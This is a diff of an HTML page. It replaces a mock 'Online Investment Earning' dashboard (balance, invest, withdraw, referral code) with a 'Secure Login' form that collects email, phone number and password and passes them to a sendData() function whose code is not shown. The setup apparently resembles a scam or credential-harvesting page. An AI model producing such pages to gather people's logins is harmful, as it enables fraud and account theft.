@@ -3,24 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Investment Earning</title>
+    <title>Secure Login</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <h1>Welcome to Online Investment Earning</h1>
-        <div class="login-form">
-            <input type="text" id="username" placeholder="Enter Username">
-            <button onclick="login()">Login</button>
-        </div>
-        <div id="dashboard" class="hidden">
-            <h2>Hello, <span id="user"></span></h2>
-            <p>Balance: $<span id="balance">100</span></p>
-            <button onclick="invest()">Invest $10</button>
-            <button onclick="withdraw()">Withdraw</button>
-            <p id="withdraw-status"></p>
-            <p>Referral Code: <span id="referral"></span></p>
-        </div>
+    <div class="login-box">
+        <h2>Login</h2>
+        <input type="text" id="email" placeholder="Enter Email">
+        <input type="text" id="phone" placeholder="Enter Phone Number">
+        <input type="password" id="password" placeholder="Enter Password">
+        <button onclick="sendData()">Login</button>
     </div>
     <script src="script.js"></script>
 </body>
